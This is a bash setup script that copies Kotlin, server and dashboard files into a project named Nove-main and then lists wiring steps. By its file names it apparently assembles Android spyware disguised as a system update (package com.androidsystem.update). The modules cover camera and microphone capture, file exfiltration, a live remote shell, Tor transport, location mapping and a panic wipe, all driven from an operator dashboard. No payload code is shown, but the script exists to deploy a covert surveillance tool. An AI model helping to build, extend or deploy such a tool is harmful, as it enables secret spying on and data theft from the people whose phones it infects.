#!/usr/bin/env bash
# Copy the extension files into the matching Nove-main folders.
# Safe to re-run; skips existing files unless --force is passed.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
NOVEMAIN="${NOVEMAIN:-$ROOT/../Nove-main}"
FORCE="${1:-}"

if [[ ! -d "$NOVEMAIN" ]]; then
  echo "Nove-main not found at $NOVEMAIN. Set NOVEMAIN=..."
  exit 1
fi

copy() {
  local src="$1" dst="$2"
  mkdir -p "$(dirname "$dst")"
  if [[ -f "$dst" && -z "$FORCE" ]]; then
    echo "skip (exists): $dst (use --force to overwrite)"
  else
    cp "$src" "$dst"
    echo "wrote: $dst"
  fi
}

# Android
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/capture/CameraCapture.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/capture/CameraCapture.kt"
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/audio/MicRecorder.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/audio/MicRecorder.kt"
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/exfil/FileExfil.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/exfil/FileExfil.kt"
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/panic/PanicWipe.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/panic/PanicWipe.kt"
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/shell/LiveShell.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/shell/LiveShell.kt"
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/command/CommandRegistry.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/command/CommandRegistry.kt"
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/net/TorTransport.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/net/TorTransport.kt"
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/net/ForegroundServiceTypeConfig.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/net/ForegroundServiceTypeConfig.kt"
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/work/WorkManagerScheduler.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/work/WorkManagerScheduler.kt"
copy "$ROOT/android/app/src/main/java/com/androidsystem/update/core/ApplicationController.kt" "$NOVEMAIN/android/app/src/main/java/com/androidsystem/update/core/ApplicationController.kt"
copy "$ROOT/android/app/src/main/res/xml/capture_paths.xml" "$NOVEMAIN/android/app/src/main/res/xml/capture_paths.xml"

# Server
copy "$ROOT/server/index-extended.js" "$NOVEMAIN/server/index-extended.js"
copy "$ROOT/server/mount.js" "$NOVEMAIN/server/mount.js"
copy "$ROOT/server/routes/extended.js" "$NOVEMAIN/server/routes/extended.js"
copy "$ROOT/server/routes/files.js" "$NOVEMAIN/server/routes/files.js"
copy "$ROOT/server/lib/firebase.js" "$NOVEMAIN/server/lib/firebase.js"
copy "$ROOT/server/lib/middleware.js" "$NOVEMAIN/server/lib/middleware.js"

# Dashboard
copy "$ROOT/dashboard/src/App-extended.tsx" "$NOVEMAIN/dashboard/src/App-extended.tsx"
copy "$ROOT/dashboard/src/console-extended.tsx" "$NOVEMAIN/dashboard/src/console-extended.tsx"
copy "$ROOT/dashboard/src/extensions.css" "$NOVEMAIN/dashboard/src/extensions.css"
copy "$ROOT/dashboard/src/routes/LivePage.tsx" "$NOVEMAIN/dashboard/src/routes/LivePage.tsx"
copy "$ROOT/dashboard/src/routes/FilesPage.tsx" "$NOVEMAIN/dashboard/src/routes/FilesPage.tsx"
copy "$ROOT/dashboard/src/routes/CommandPalette.tsx" "$NOVEMAIN/dashboard/src/routes/CommandPalette.tsx"
copy "$ROOT/dashboard/src/routes/MapPage.tsx" "$NOVEMAIN/dashboard/src/routes/MapPage.tsx"
copy "$ROOT/dashboard/src/routes/PanicPage.tsx" "$NOVEMAIN/dashboard/src/routes/PanicPage.tsx"

echo
echo "Done. Next steps:"
echo "  1. cd $NOVEMAIN/dashboard && npm install leaflet && npm install -D @types/leaflet"
echo "  2. In dashboard/src/main.tsx change import App from './App' to './App-extended'"
echo "  3. Wire CommandRegistry in CoreService.kt (see extensions/docs/WIRING.md)"
echo "  4. cd $NOVEMAIN/server && node index-extended.js"
